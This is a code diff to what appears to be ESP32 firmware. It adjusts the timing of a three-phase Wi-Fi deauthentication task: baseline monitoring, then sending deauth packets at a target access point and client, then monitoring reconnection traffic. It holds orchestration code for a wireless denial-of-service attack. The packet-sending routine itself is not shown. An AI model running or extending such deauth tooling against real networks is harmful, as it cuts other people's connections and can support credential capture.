@@ -244,7 +244,7 @@ static void deauth_with_test_task(void *vParameters) {
     memset(&effectiveness_stats, 0, sizeof(deauth_effectiveness_t));
     
     // PHASE 1: Baseline monitoring
-    ESP_LOGI(TAG, "Phase 1: Baseline monitoring (2s)...");
+    ESP_LOGI(TAG, "Phase 1: Baseline monitoring...");
     BleManager_SendStatus("LOG|DEAUTH|msg=Phase 1: Baseline monitoring...");
     monitoring_phase = 0;
     start_monitoring();
@@ -268,11 +268,11 @@ static void deauth_with_test_task(void *vParameters) {
     }
     
     // PHASE 2: Attack
-    ESP_LOGI(TAG, "Phase 2: Deauth attack (3s)...");
+    ESP_LOGI(TAG, "Phase 2: Deauth attack...");
     BleManager_SendStatus("LOG|DEAUTH|msg=Phase 2: Sending deauth packets...");
     monitoring_phase = 1;
     
-    send_deauth_packets_timed(target_ap, target_client, 5000); // milli
+    send_deauth_packets_timed(target_ap, target_client, 6000); // milli
     
     ESP_LOGI(TAG, "Attack phase complete");
     
@@ -280,9 +280,9 @@ static void deauth_with_test_task(void *vParameters) {
     ESP_LOGI(TAG, "Phase 3: Post-attack monitoring (5s)...");
     BleManager_SendStatus("LOG|DEAUTH|msg=Phase 3: Monitoring responses...");
     monitoring_phase = 2;
-    vTaskDelay(pdMS_TO_TICKS(100)); // laps before monitoring
+    vTaskDelay(pdMS_TO_TICKS(50)); // laps before monitoring
     start_monitoring();
-    vTaskDelay(pdMS_TO_TICKS(10000));
+    vTaskDelay(pdMS_TO_TICKS(6000));
     stop_monitoring();
     
     ESP_LOGI(TAG, "Post-attack: %lu auth, %lu reassoc, %lu probe req", 
